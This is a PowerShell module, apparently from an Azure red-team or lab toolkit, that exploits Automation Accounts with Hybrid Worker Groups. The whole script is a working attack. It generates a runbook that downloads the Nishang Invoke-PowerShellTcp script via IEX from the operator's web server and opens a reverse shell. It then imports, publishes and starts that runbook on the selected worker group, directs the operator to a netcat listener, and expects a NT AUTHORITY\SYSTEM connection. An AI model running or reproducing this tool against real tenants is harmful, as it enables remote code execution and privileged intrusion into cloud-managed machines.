# Automation Account exploitation module

function Invoke-AutomationExploit {
    Write-Host "`n`n=== AUTOMATION ACCOUNT EXPLOITATION ===" -ForegroundColor Red
    
    if (@($Global:AutomationAccounts).Count -eq 0) {
        Write-Host "[-] No Automation Accounts available" -ForegroundColor Red
        return
    }
    
    # Configuration
    $OutputFolder = "C:\Users\Public"
    $XamppHtdocs = "C:\xampp\htdocs"
    $PowerShellTcpScript = "Invoke-PowerShellTcp.ps1"
    
    # Pre-flight checks
    Write-Host "`n[*] Running pre-flight checks..." -ForegroundColor Yellow
    
    # Check if XAMPP htdocs folder exists
    if (-not (Test-Path $XamppHtdocs)) {
        Write-Host "[-] XAMPP htdocs folder not found: $XamppHtdocs" -ForegroundColor Red
        Write-Host "[!] Please install XAMPP or modify the `$XamppHtdocs variable" -ForegroundColor Yellow
        
        $continue = Read-Host "Do you want to continue anyway? (y/n)"
        if ($continue -ne 'y' -and $continue -ne 'Y') {
            return
        }
    } else {
        Write-Host "[+] XAMPP htdocs folder found: $XamppHtdocs" -ForegroundColor Green
    }
    
    # Check if Invoke-PowerShellTcp.ps1 exists in htdocs
    $PowerShellTcpPath = Join-Path $XamppHtdocs $PowerShellTcpScript
    if (-not (Test-Path $PowerShellTcpPath)) {
        Write-Host "[-] Reverse shell script not found: $PowerShellTcpPath" -ForegroundColor Red
        Write-Host "[!] You need to download Invoke-PowerShellTcp.ps1 and place it in: $XamppHtdocs" -ForegroundColor Yellow
        Write-Host "[!] Download from: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" -ForegroundColor Cyan
        
        $continue = Read-Host "Do you want to continue anyway? (y/n)"
        if ($continue -ne 'y' -and $continue -ne 'Y') {
            return
        }
    } else {
        Write-Host "[+] Reverse shell script found: $PowerShellTcpPath" -ForegroundColor Green
    }
    
    # Check if netcat is available
    $netcatFound = $false
    $netcatPaths = @("nc.exe", "nc64.exe", "ncat.exe")
    foreach ($nc in $netcatPaths) {
        if (Get-Command $nc -ErrorAction SilentlyContinue) {
            Write-Host "[+] Netcat found: $nc" -ForegroundColor Green
            $netcatFound = $true
            break
        }
    }
    
    if (-not $netcatFound) {
        Write-Host "[-] Netcat not found in PATH" -ForegroundColor Red
        Write-Host "[!] Please install netcat or add it to your PATH" -ForegroundColor Yellow
        Write-Host "[!] Download from: https://eternallybored.org/misc/netcat/" -ForegroundColor Cyan
        
        $continue = Read-Host "Do you want to continue anyway? (y/n)"
        if ($continue -ne 'y' -and $continue -ne 'Y') {
            return
        }
    }
    
    # Check if XAMPP Apache is running
    $apacheRunning = Get-Process -Name "httpd" -ErrorAction SilentlyContinue
    if (-not $apacheRunning) {
        Write-Host "[-] Apache (XAMPP) is not running" -ForegroundColor Red
        Write-Host "[!] Please start XAMPP Apache server" -ForegroundColor Yellow
    } else {
        Write-Host "[+] Apache is running" -ForegroundColor Green
    }
    
    Write-Host "`n[+] Pre-flight checks complete" -ForegroundColor Green
    
    # Get local IP address
    Write-ExecutedCommand "Get-NetIPAddress -AddressFamily IPv4"
    $DefaultIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.254.*" } | Select-Object -First 1).IPAddress
    
    Write-Host "`n[*] Detected local IP: $DefaultIP" -ForegroundColor Yellow
    $LocalIP = Read-Host -Prompt "Enter your local IP address (press Enter for default: $DefaultIP)"
    if ([string]::IsNullOrWhiteSpace($LocalIP)) {
        $LocalIP = $DefaultIP
    }
    
    $Port = Read-Host -Prompt "Enter listener port (press Enter for default: 1234)"
    if ([string]::IsNullOrWhiteSpace($Port)) {
        $Port = "1234"
    }
    
    # Test if PowerShell script is accessible via HTTP
    Write-Host "`n[*] Testing web server accessibility..." -ForegroundColor Yellow
    $testUrl = "http://${LocalIP}/${PowerShellTcpScript}"
    try {
        Write-ExecutedCommand "Invoke-WebRequest -Uri `"$testUrl`" -UseBasicParsing -TimeoutSec 5"
        $response = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        Write-Host "[+] Reverse shell script is accessible: $testUrl" -ForegroundColor Green
    } catch {
        Write-Host "[-] Cannot access reverse shell script at: $testUrl" -ForegroundColor Red
        Write-Host "[!] Make sure XAMPP Apache is running and serving the file" -ForegroundColor Yellow
        
        $continue = Read-Host "Do you want to continue anyway? (y/n)"
        if ($continue -ne 'y' -and $continue -ne 'Y') {
            return
        }
    }
    
    # Select Automation Account
    Write-Host "`n[*] Available Automation Accounts:" -ForegroundColor Cyan
    for ($i = 0; $i -lt $Global:AutomationAccounts.Count; $i++) {
        Write-Host "  [$i] $($Global:AutomationAccounts[$i].AutomationAccountName) (RG: $($Global:AutomationAccounts[$i].ResourceGroupName))" -ForegroundColor White
    }
    
    $accountIndex = Read-Host -Prompt "Select Automation Account index"
    $selectedAccount = $Global:AutomationAccounts[$accountIndex]
    $AutomationAccountName = $selectedAccount.AutomationAccountName
    $ResourceGroupName = $selectedAccount.ResourceGroupName
    
    # Get Worker Groups
    Write-ExecutedCommand "Get-AzAutomationHybridWorkerGroup -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName"
    $workerGroups = Get-AzAutomationHybridWorkerGroup -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -ErrorAction SilentlyContinue
    
    if (-not $workerGroups -or $workerGroups.Count -eq 0) {
        Write-Host "[-] No Hybrid Worker Groups found. Cannot exploit." -ForegroundColor Red
        return
    }
    
    Write-Host "`n[*] Available Hybrid Worker Groups:" -ForegroundColor Cyan
    for ($i = 0; $i -lt $workerGroups.Count; $i++) {
        Write-Host "  [$i] $($workerGroups[$i].Name)" -ForegroundColor White
    }
    
    $workerIndex = Read-Host -Prompt "Select Hybrid Worker Group index"
    $WorkerGroupName = $workerGroups[$workerIndex].Name
    
    $RunbookName = Read-Host -Prompt "Enter Runbook name (e.g., student55)"
    
    Write-Host "`n[*] Configuration:" -ForegroundColor Cyan
    Write-Host "  Local IP            : $LocalIP" -ForegroundColor White
    Write-Host "  Listener Port       : $Port" -ForegroundColor White
    Write-Host "  Automation Account  : $AutomationAccountName" -ForegroundColor White
    Write-Host "  Resource Group      : $ResourceGroupName" -ForegroundColor White
    Write-Host "  Runbook Name        : $RunbookName" -ForegroundColor White
    Write-Host "  Worker Group        : $WorkerGroupName" -ForegroundColor White
    
    # Create reverse shell script
    Write-Host "`n[*] Creating reverse shell script..." -ForegroundColor Yellow
    $RunbookScript = "powershell `"IEX (New-Object Net.Webclient).downloadstring('http://${LocalIP}/${PowerShellTcpScript}');Power -Reverse -IPAddress $LocalIP -Port $Port`""
    $RunbookScriptPath = Join-Path $OutputFolder "$RunbookName.ps1"
    
    try {
        $RunbookScript | Out-File -FilePath $RunbookScriptPath -Encoding ASCII -Force
        Write-Host "[+] Runbook script created: $RunbookScriptPath" -ForegroundColor Green
        Write-Host "`nScript content:" -ForegroundColor Cyan
        Write-Host $RunbookScript -ForegroundColor Gray
    } catch {
        Write-Host "[-] Error creating runbook script: $_" -ForegroundColor Red
        return
    }
    
    # Setup instructions
    Write-Host "`n`n=== MANUAL SETUP REQUIRED ===" -ForegroundColor Red
    Write-Host "`n[!] Step 1: Verify web server" -ForegroundColor Yellow
    Write-Host "    - XAMPP Apache should be running" -ForegroundColor White
    Write-Host "    - Verify file is accessible: $testUrl" -ForegroundColor White
    
    Write-Host "`n[!] Step 2: Setup netcat listener" -ForegroundColor Yellow
    Write-Host "    Open a NEW terminal and run:" -ForegroundColor White
    Write-Host "    nc64.exe -lvnp $Port" -ForegroundColor Cyan
    
    Write-Host "`n[!] Press any key when ready to continue..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    
    # Import runbook
    Write-Host "`n[*] Importing runbook into Automation Account..." -ForegroundColor Yellow
    try {
        Write-ExecutedCommand "Import-AzAutomationRunbook -Name $RunbookName -Path $RunbookScriptPath -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell -Force"
        $importResult = Import-AzAutomationRunbook -Name $RunbookName -Path $RunbookScriptPath -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -Type PowerShell -Force -ErrorAction Stop
        Write-Host "[+] Runbook imported successfully" -ForegroundColor Green
        Write-Host "    State  : $($importResult.State)" -ForegroundColor White
    } catch {
        Write-Host "[-] Error importing runbook: $_" -ForegroundColor Red
        return
    }
    
    # Publish runbook
    Write-Host "`n[*] Publishing runbook..." -ForegroundColor Yellow
    try {
        Write-ExecutedCommand "Publish-AzAutomationRunbook -RunbookName $RunbookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName"
        $publishResult = Publish-AzAutomationRunbook -RunbookName $RunbookName -AutomationAccountName $AutomationAccountName -ResourceGroupName $ResourceGroupName -ErrorAction Stop
        Write-Host "[+] Runbook published successfully" -ForegroundColor Green
        Write-Host "    State  : $($publishResult.State)" -ForegroundColor White
    } catch {
        Write-Host "[-] Error publishing runbook: $_" -ForegroundColor Red
        return
    }
    
    # Final confirmation
    Write-Host "`n`n=== FINAL CHECK ===" -ForegroundColor Red
    Write-Host "[!] Verify the following before starting the runbook:" -ForegroundColor Yellow
    Write-Host "    [1] XAMPP is running and serving $PowerShellTcpScript" -ForegroundColor White
    Write-Host "    [2] Netcat listener is running on port $Port" -ForegroundColor White
    Write-Host "    [3] Firewall allows incoming connections on port $Port" -ForegroundColor White
    
    Write-Host "`n[!] Press any key to start the runbook and trigger reverse shell..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    
    # Start runbook
    Write-Host "`n[*] Starting runbook on Hybrid Worker Group: $WorkerGroupName" -ForegroundColor Yellow
    try {
        Write-ExecutedCommand "Start-AzAutomationRunbook -Name $RunbookName -ResourceGroupName $ResourceGroupName -AutomationAccountName $AutomationAccountName -RunOn $WorkerGroupName"
        $jobResult = Start-AzAutomationRunbook -Name $RunbookName -ResourceGroupName $ResourceGroupName -AutomationAccountName $AutomationAccountName -RunOn $WorkerGroupName -ErrorAction Stop
        Write-Host "[+] Runbook started successfully!" -ForegroundColor Green
        Write-Host "    Job ID : $($jobResult.JobId)" -ForegroundColor White
        
        Write-Host "`n[+] Check your netcat listener for incoming connection..." -ForegroundColor Green
        Write-Host "[+] Expected connection from Hybrid Worker as NT AUTHORITY\SYSTEM" -ForegroundColor Green
    } catch {
        Write-Host "[-] Error starting runbook: $_" -ForegroundColor Red
        return
    }
    
    Write-Host "`n=== Exploitation Complete ===" -ForegroundColor Cyan
    Write-Host "`n[*] Runbook Details:" -ForegroundColor Yellow
    Write-Host "    Script Path : $RunbookScriptPath" -ForegroundColor White
    Write-Host "    Listener    : ${LocalIP}:${Port}" -ForegroundColor White
    Write-Host "    Target      : $WorkerGroupName" -ForegroundColor White
    
    Write-Host "`n[*] Press any key to return to main menu..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

# Helper function to display executed commands
function Write-ExecutedCommand {
    param(
        [string]$Command
    )
    Write-Host "`n[CMD] " -ForegroundColor Magenta -NoNewline
    Write-Host $Command -ForegroundColor Gray
}
